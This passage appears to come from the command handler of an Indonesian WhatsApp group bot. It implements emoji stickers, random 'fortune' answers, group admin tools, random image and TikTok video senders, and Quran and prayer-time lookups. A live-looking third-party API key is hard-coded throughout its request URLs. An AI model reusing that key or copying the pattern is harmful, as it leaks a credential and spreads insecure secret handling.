if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "6")
break
//========================
case 'skypeemoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "7")
break
//========================
case 'joyemoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "8")
break
//========================
case 'mojiemoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "9")
break
//========================
case 'pediaemoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "10")
break
//========================
case 'pulsa': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
Al.sendMessage(m.chat, { image: { url: global.pulsa }, caption: 'NIE YAH BANG 😁'}, { quoted: m })
}
break
//========================
case 'getnamegc': 
case 'getsubjekgc': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let kntl = `*${groupName}*`
m.reply(kntl)
}
break
//========================
case 'getdesc': 
case 'getdesk': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let iya = `DESKRIPSI GRUB *${groupName}*\n\n${groupMetadata.desc}`
m.reply(iya)
}
break
//========================
case 'getid': 
case 'getidgrup': 
case 'getidgc': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let tod = `*GET ID GRUB*\n${groupMetadata.id}\n\n*GRUB NAME :* ${groupName}`
m.reply(tod)
}
break
//========================
case 'cekmem': 
case 'cekmember': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let kntl = `CEK MEMBER *${groupName}*\n• ${groupMetadata.participants.length} Member grup!`
m.reply(kntl)
}
break
//========================
case 'is':
case 'apakah': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :* ${prefix}apakah saya wibu`)
const apa = ['Iya', 'Tidak', 'Mungkin iya', 'Mungkin tidak', 'Gak tau', 'Kamu nanya']
const kah = apa[Math.floor(Math.random() * apa.length)]
Al.sendMessage(m.chat, {text: `*Pertanyaan :* Apakah ${q}\n*Jawaban :* ${kah}` }, {quoted: fkontak})
}
break
//========================
case 'who':
case 'siapakah': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :* ${prefix}siapakah mas agus`)
const siapa = ['Yanto', 'Yanti', 'Agus', 'Amel', 'Asep', 'Amelia', 'Lala', 'Lili', 'Bagas', 'Bagas dribble', 'Alya', 'Padil', 'Rian', 'Riski', 'Reski', 'Adel', 'Freya', 'Darwin dongo', 'Alvin', 'Kevin', 'Rara', 'Riri', 'Rehan', 'Rina', 'Reisya', 'Riska', 'Akbar', 'Jamal', 'Ela', 'Rasya', 'Ali', 'Susi', 'Eka', 'Mas amin', 'Jaki', 'Jaka', 'Rakha', 'Yaka', 'Gak tau', 'Kamu nanya']
const kih = siapa[Math.floor(Math.random() * siapa.length)]
Al.sendMessage(m.chat, {text: `*Pertanyaan :* Siapakah ${q}\n*Jawaban :* ${kih}` }, {quoted: fkontak})
}
break
//========================
case 'benarkah': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :* ${prefix}benarkah saya wibu`)
const ben = ['Bener', 'Mungkin bener', 'Gak bener', 'Gak', 'Gak tau', 'Kamu nanya']
const arkah = ben[Math.floor(Math.random() * ben.length)]
m.reply(`*Pertanyaan :* Benarkah ${q}\n*Jawaban :* ${arkah}`)
}
break
//========================
case 'gantengcek':
case 'cekganteng': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh #1 :* ${prefix}cekganteng @Tag\n\n*Contoh #2 :* ${prefix}cekganteng Wann?`)
const gan = ['1% Jelek banget', '10% Jelek ah', '20% Jelek sih', '30% Jelek', '40% Jelek dikit', '50% Lumayan', '60% Ganteng dikit', '70% Ganteng', '80% Ganteng ih', '90% Ganteng bnget', '100% Ganteng bnget anjir', 'Gak tau', 'Kamu nanya']
const teng = gan[Math.floor(Math.random() * gan.length)]
m.reply(`*Pertanyaan :* Cekganteng ${q}\n*Jawaban :* ${teng}`)
}
break
//========================
case 'cantikcek':
case 'cekcantik': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh #1 :* ${prefix}cekcantik @Tag\n\n*Contoh #2 :* ${prefix}cekcantik Rara penjas?`)
const can = ['1% Jelek banget', '10% Jelek ah', '20% Jelek sih', '30% Jelek', '40% Jelek dikit', '50% Lumayan', '60% Cantik dikit', '70% Cantik', '80% Cantik ih', '90% Cantik bnget', '100% Cantik bnget anjir', 'Gak tau', 'Kamu nanya']
const tik = can[Math.floor(Math.random() * can.length)]
m.reply(`*Pertanyaan :* Cekcantik ${q}\n*Jawaban :* ${tik}`)
}
break
//========================
case 'cosplay':
  Al.sendFile(m.chat, `https://fantox-cosplay-api.onrender.com/`, '', `Random Image ${command}`, m)
break
//========================
case 'douyin':
  Al.sendFile(m.chat, `https://widipe.com/asupandouyin/`, '', `𝐌𝐚𝐧𝐮-𝐌𝐃  search ${command}`, m)
break
//========================
case 'picre':
  Al.sendFile(m.chat, `https://pic.re/image`, '', `Random Image ${command}\n\n*Powered by pic.re`, m)
break
//========================
case 'danbooru': {
  async function DanbooruRandom() {
    try {
      let response = await axios.get('https://danbooru.donmai.us/posts.json')
      let results = response.data

      if (!Array.isArray(results) || results.length === 0) {
        throw new Error('No images found')
      }

      let randomImage = results[Math.floor(Math.random() * results.length)]
      let imageUrl = randomImage.url || randomImage.sample_url || randomImage.file_url

      if (!imageUrl) {
        throw new Error('Image URL not found')
      }

      return { status: 200, imageUrl }
    } catch (error) {
      console.error('Error:', error)
      return { status: 500, error: error.message }
    }
  }

  async function sendRandomDanbooruImage(m) {
    try {
      let response = await DanbooruRandom()
      if (response.status !== 200) {
        throw new Error(response.error)
      }

      let imageUrl = response.imageUrl

      Al.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image from Danbooru.dommai.us\n\n*Powered By Danbooru.donmai.us*' }, { quoted: m })
    } catch (e) {
      m.reply(e.message)
    }
  }

  sendRandomDanbooruImage(m)
}
break
//========================
case 'yandere': {
  async function YandereRandom() {
    try {
      let response = await axios.get('https://yande.re/post.json?api_version=2')
      let results = response.data.posts // Pastikan untuk mengakses data posts

      if (!Array.isArray(results) || results.length === 0) {
        throw new Error('No images found')
      }

      let randomImage = results[Math.floor(Math.random() * results.length)]
      let imageUrl = randomImage.jpeg_url || randomImage.sample_url || randomImage.file_url

      if (!imageUrl) {
        throw new Error('Image URL not found')
      }

      return { status: 200, imageUrl }
    } catch (error) {
      console.error('Error:', error)
      return { status: 500, error: error.message }
    }
  }

  async function sendRandomYandereImage(m) {
    try {
      let response = await YandereRandom()
      if (response.status !== 200) {
        throw new Error(response.error)
      }

      let imageUrl = response.imageUrl

      Al.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image from Yande.re\n\n*Powered By yande.re*' }, { quoted: m })
    } catch (e) {
      m.reply(e.message)
    }
  }

  sendRandomYandereImage(m)
}
break
//========================
case 'tiktokghea': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('Tunggu bentar...')
var gheayubi = JSON.parse(fs.readFileSync('./search/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Al.sendMessage(m.chat, { caption: 'Successfully!', video: { url: hasil.url }}, { quoted: m })
}
break
//========================
case 'cosplayangel': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('Tunggu bentar...')
var gheayubi = JSON.parse(fs.readFileSync('./search/tiktokvids/cosplayangel.json'))
var hasil = pickRandom(gheayubi)
Al.sendMessage(m.chat, { caption: 'Successfully!', video: { url: hasil.url }}, { quoted: m })
}
break
//========================
case 'tiktokbocil': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('Tunggu bentar...')
var bocil = JSON.parse(fs.readFileSync('./search/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Al.sendMessage(m.chat, { caption: 'Successfully!', video: { url: hasil.url }}, { quoted: m })
}
break
//========================
case 'videosad': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('Tunggu bentar...')
var ukhty = JSON.parse(fs.readFileSync('./searc/tiktokvids/videosad.json'))
var hasil = pickRandom(ukhty)
Al.sendMessage(m.chat, { caption: 'Successfully!', video: { url: hasil.url }}, { quoted: m })
}
break
//========================
case 'wibuvid': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('Tunggu bentar...')
var santuy = JSON.parse(fs.readFileSync('./search/tiktokvids/wibuvid.json'))
var hasil = pickRandom(santuy)
Al.sendMessage(m.chat, { caption: 'Successfully!', video: { url: hasil.url }}, { quoted: m })
}
break
//========================
case 'tiktokkayes': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('Tunggu bentar...')
var kayes = JSON.parse(fs.readFileSync('./search/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Al.sendMessage(m.chat, { caption: 'Successfully!', video: { url: hasil.url }}, { quoted: m })
}
break
//========================
case 'tiktokpanrika': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('Tunggu bentar...')
var rikagusriani = JSON.parse(fs.readFileSync('./search/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Al.sendMessage(m.chat, { caption: 'Successfully!', video: { url: hasil.url ,viewOnce: true}}, { quoted: m })
}
break
//========================
case 'videogalau': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('Tunggu bentar...')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokvids/galau.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Successfully!', video: { url: hasil.url }}, { quoted: m })
}
break   
//========================
case 'tourl1': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
		try{
	m.reply('Tunggu bentar...')
	let media = await Al.downloadAndSaveMediaMessage(quoted,makeid(5))
	if(isAllMedia || isQuotedImage || isQuotedAudio || isQuotedVideo ||  isQuotedSticker){  
	let anuu = await TelegraPh (media)
	m.reply (anuu)
	} else {
m.reply(`Kirim gambar dengan Caption ${prefix+command} atau reply gambar/sticker`)
     }
	await fs.unlinkSync(media)
		} catch (e) {
			console.log(e)
m.reply('Erorr kak')
return
	
		}
	}
	break
//========================
case 'attp':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Masukan Textnya!\n\n*Contoh :* ${prefix+command} Wann Keren`)
Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
await Al.sendMessage(m.chat, { sticker: { url: `https://api.lolhuman.xyz/api/attp?apikey=3ded02033757fbd61ff60876&text=${q}`} }, { quoted: m })
break
//========================
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
case 'ttp5':
case 'ttp6':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Masukan Textnya!\n\n*Contoh :* ${prefix+command} Wann Keren`)
Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
await Al.sendMessage(m.chat, { sticker: { url: `https://api.lolhuman.xyz/api/${command}?apikey=3ded02033757fbd61ff60876&text=${q}`} }, { quoted: m })
break
//========================
case 'getpp':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if(isQuotedTag || isQuotedReply ){
if (m.message.extendedTextMessage === null || m.message.extendedTextMessage === undefined) return m.reply('Reply target atau tagnya')
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await Al.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

Al.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
}
break 
//========================
case 'getppgrup':
case 'getppgc':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
	if (!m.isGroup) return 
	m.reply('Tunggu bentar...')
	try {
	var ppimg = await Al.profilePictureUrl(from, 'image')
	} catch (err) {
	console.log(err)
	var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	}
	await Al.sendMessage(from, { image: { url: ppimg }}, { quoted: m })
	break
//========================
case 'getnama':
case 'getname':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!quoted) return m.reply('Reply targetnya!')
if(!m.isGroup && !isCreator) { 
console.log(users)
const sname = await Al.getName(users)
m.reply(sname)
} else if(!m.isGroup) {
const yahu = await Al.getName(users)
m.reply(yahu)
}
break
//========================
case 'setnamagc':
case 'setnamegc':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
	if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin grup!')
	if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
	if (args.length < 1) return m.reply(`Kirim perintah ${command} teks`)
	await Al.groupUpdateSubject(from, q)
	.then( res => {
	m.reply(`Sukses mengganti subjek grup!`)
	}).catch(() => m.reply('Error kak'))
	break
//========================
case 'listonline': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
Al.sendText(from, '*LIST ONLINE :*\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break
//========================
 case 'waktututup':
 case 'closetime': 
 if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
	if (!isAdmins) return m.reply('Fitur Khusus Admin grup!')
	if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
	if (args[1]=="detik") {var timer = args[0]*`1000`
	} else if (args[1]=="menit") {var timer = args[0]*`60000`
	} else if (args[1]=="jam") {var timer = args[0]*`3600000`
	} else if (args[1]=="hari") {var timer = args[0]*`86400000`
	} else {return m.reply("*Pilih :*\nDetik\nMenit\nJam\n\n*Contoh*\n10 detik")}
	m.reply(`Close time ${q} dimulai dari sekarang`)
	setTimeout( () => {
	var nomor = m.participant
	const close = `*[ CLOSE TIME ]* Grup ditutup oleh Admin\nSekarang hanya admin yang dapat mengirim pesan\n\n*GRUB NAME :* ${groupName}`
	Al.groupSettingUpdate(from, 'announcement')
	m.reply(close)
	}, timer)
	break
//========================
    case 'waktubuka':
	case 'opentime':        
	if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
	if (!isAdmins) return m.reply('Fitur Khusus Admin grup!')
	if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
	if (args[1]=="detik") {var timer = args[0]*`1000`
	} else if (args[1]=="menit") {var timer = args[0]*`60000`
	} else if (args[1]=="jam") {var timer = args[0]*`3600000`
	} else if (args[1]=="hari") {var timer = args[0]*`86400000`
	} else {return m.reply("*Pilih :*\nDetik\nMenit\nJam\n\n*Contoh*\n10 detik")}
	m.reply(`Open time ${q} dimulai dari sekarang`)
	setTimeout( () => {
	var nomor = m.participant
	const open = `*[ OPEN TIME ]* Grup dibuka oleh Admin\nSekarang semua member dapat mengirim pesan\n\n*GRUB NAME :* ${groupName}`
	Al.groupSettingUpdate(from, 'not_announcement')
	m.reply(open)
	}, timer)
	break
//========================
case 'pol':
case 'poll': 
case 'poling': 
case 'polling': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
function checkDuplicate(arr) {
    return new Set(arr).size !== arr.length
}
    let a = q.split("|").slice(1)
    if (!a[1] && !q) return m.reply(`*Contoh :*\n${prefix+command} Setuju gak |Setuju|Gak`)
    if (a[12]) return m.reply('Kebanyakan pilihan, Format\n' + prefix + command + 'Wann kull? |Iya Lah|Gak')
    if (checkDuplicate(a)) return m.reply('Pilihan polling nya ada yang sama kak :v')
    let nama = await Al.getName(m.sender)
    let b = text.split('|')
    let cap = `Polling For *${groupName}*\n\n*Nama :* ${nama}\n*Pesan :* ${text.split('|')[0]}`

    const pollMessage = {
        name: cap,
        values: a,
        multiselect: false,
        selectableCount: 1
    }
    await Al.sendMessage(m.chat, {
        poll: pollMessage
    })
}
break
//========================
case 'setbiobot':   
	 {
 if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
	if (!isCreator) return m.reply("Special For Owner Features!")
	if (!q) return m.reply(`Kirim perintah ${prefix+command} nama\n\n*Contoh :* ${command} AiBotzz-MD Aktif`)
	await Al.updateProfileStatus(q)
	await m.reply(`Berhasil mengganti status bio ke *${q}*`)
	}
	break
//========================
case 'ban': 
case 'banned': {
if (!isCreator) return m.reply(mess.OnlyOwner)
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/Reply Target Yang Mau Di ${command}`)
banned.push(users)
fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
Al.sendTextWithMentions(m.chat, `Succes banned @${users.split('@')[0]}`, m)
} catch (err) {
m.reply(`Tag/Reply Target Yang Mau Di Banned`)
}
}
break
//========================
case 'unban': 
case 'unbanned': {
if (!isCreator) return m.reply(mess.OnlyOwner)
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/Reply Target Yang Mau Di ${command}`)
let anu = banned.indexOf(users)
banned.splice(anu, 1)
fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
Al.sendTextWithMentions(m.chat, `Succes Unbanned @${users.split('@')[0]}`, m)
} catch (err) {
m.reply(`Tag/Reply Target Yang Mau Di Un-Banned`)
}
}
break
//========================
case 'listban1': 
case 'blocklist1': 
case 'banlist1': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
	const lisban = "Total Block: " + banUser.length
	m.reply(lisban)
	}
	break
//========================
case 'setdesc': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Kirim perintah :* ${command} teks`)
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
await Al.groupUpdateDescription(from, q)
.then( res => {
m.reply(`Sukses mengganti deskripsi ${groupName}\n\n*DESKRIPSI SEBELUMNYA*\n${groupMetadata.desc}\n\nKlik profil grup ini untuk melihat deskripsi dengan jelas.`)
}).catch(() => m.reply('Error kak'))
}
break
//========================
case 'setppgc1':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin grup')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
if (isQuotedImage) {
let media = await Al.downloadAndSaveMediaMessage(quoted,makeid(5))
await Al.updateProfilePicture(from, { url: media })
.then( res => {
m.reply(`Sukses mengganti pp *${groupName}*`)
fs.unlinkSync(media)
}).catch(() => m.reply('Error kak'))
} else {
m.reply(`Kirim/balas gambar dengan caption ${command}`)
}
}
break
//========================
case 'deleteppgroup': 
case 'delppgc': 
case 'deleteppgc': 
case 'delppgroup': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
    await Al.removeProfilePicture(from)
await m.reply(`Sukses menghapus pp *${groupName}*`)
    }
    break
//========================
case 'jodohku':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let member = participants.map(u => u.id)
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `*JODOHKU*\nJodoh lu yaitu @${jodoh.split('@')[0]} 🤭`
let menst = [jodoh]
Al.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
}
break
//========================
case 'gcbot': 
case 'grupbot': 
case 'grubbot': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let yows = `GRUB BOT *AIBOTZZ* NIH\n\nGas Join!`
aiRep3(yows)
}
break
//========================
case 'unblock': 
case 'unblok': {
if (!isCreator) return m.reply('Special For Owner Features!') 
if (!text) return m.reply(`Enter nomor target!`)
let unblok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
Al.updateBlockStatus(unblok, 'unblock')
m.reply(`Sukses unblock @${unblok.split('@')[0]}`)
}
break
//========================
case 'listblock':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
	let block = await Al.fetchBlocklist()            
	m.reply('List Block :\n\n' + `Total: ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '• @' + v.replace(/@.+/, '')).join`\n`)
	}
	break 
//========================
case 'surah':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (args.length < 1) return m.reply(`*Contoh :* ${prefix + command} 18 atau ${prefix + command} 18/10 atau ${prefix + command} 18/1-10`)
await m.reply('_Loading..._')
axios
.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=3ded02033757fbd61ff60876`)
.then(({ data }) => {
var ayat = data.result.ayat
var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
}
text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
m.reply(text)
})
.catch(console.error)
break
//========================
case 'listsurah':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await m.reply('_Loading..._')
axios
.get(`https://api.lolhuman.xyz/api/quran?apikey=3ded02033757fbd61ff60876`)
.then(({ data }) => {
var text = '*LIST SURAH AL-QURAN*\n\n'
for (var x in data.result) {
text += `${x}. ${data.result[x]}\n`
}
m.reply(text)
})
.catch(console.error)
break
//========================
case 'kisahnabi': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (args.length == 0) return m.reply(`Example: ${prefix + command} Muhammad`)
m.reply('_Loading..._')
axios.get(`https://api.lolhuman.xyz/api/kisahnabi/${q}?apikey=3ded02033757fbd61ff60876`)
.then(({ data }) => {
var nabi = `Name : ${data.result.name}\n`
nabi += `Lahir : ${data.result.thn_kelahiran}\n`
nabi += `Umur : ${data.result.age}\n`
nabi += `Tempat : ${data.result.place}\n`
nabi += `Story : \n\n${data.result.story}`
m.reply(nabi)
})
.catch(console.error)
}
break
//========================
case 'jadwalsholat':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (args.length == 0) return m.reply(`Contoh : ${prefix + command} Tangerang Selatan`)
axios.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=3ded02033757fbd61ff60876`)
.then(({ data }) => {
var text = `• Wilayah : ${data.result.wilayah}\n\n`
text += `• Tanggal : ${data.result.tanggal}\n`
text += `• Sahur : ${data.result.sahur}\n`
text += `• Imsak : ${data.result.imsak}\n`
text += `• Subuh : ${data.result.subuh}\n`
text += `• Terbit : ${data.result.terbit}\n`
text += `• Dhuha : ${data.result.dhuha}\n`
text += `• Dzuhur : ${data.result.dzuhur}\n`
text += `• Ashar : ${data.result.ashar}\n`
text += `• Maghrib : ${data.result.maghrib}\n`
text += `• Isya : ${data.result.isya}`
m.reply(text)
})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))
}
break
//========================
case 'asmaulhusna':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
axios.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=3ded02033757fbd61ff60876`)
.then(({ data }) => {
var text = `• No : ${data.result.index}\n`
text += `• Latin : ${data.result.latin}\n`
text += `• Arab : ${data.result.ar}\n`
text += `• Indonesia : ${data.result.id}\n`
text += `• English : ${data.result.en}`
m.reply(text)
})
.catch((err) => m.reply('Server sedang Error coba lag besok!')) 
}
break 
//========================
case 'infocuaca1': 
case 'cuaca1': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :* ${prefix + command} Tasikmalaya`)
m.reply('_Loading..._')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${q}?apikey=3ded02033757fbd61ff60876`)
var titttttttttt = `Tempat : ${data.result.tempat}\n`
titttttttttt += `Cuaca : ${data.result.cuaca}\n`
titttttttttt += `Angin : ${data.result.angin}\n`
titttttttttt += `Description : ${data.result.description}\n`
titttttttttt += `Kelembapan : ${data.result.kelembapan}\n`
titttttttttt += `Suhu : ${data.result.suhu}\n`
titttttttttt += `Udara : ${data.result.udara}\n`
titttttttttt += `Permukaan laut : ${data.result.permukaan_laut}\n`
Al.sendMessage(m.chat, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
m.reply(titttttttttt)
}
break
//========================
case 'china':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break
//========================
case 'hijab':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break
//========================
case 'indo':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break
//========================
case 'japanese': 
case 'jepang': 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
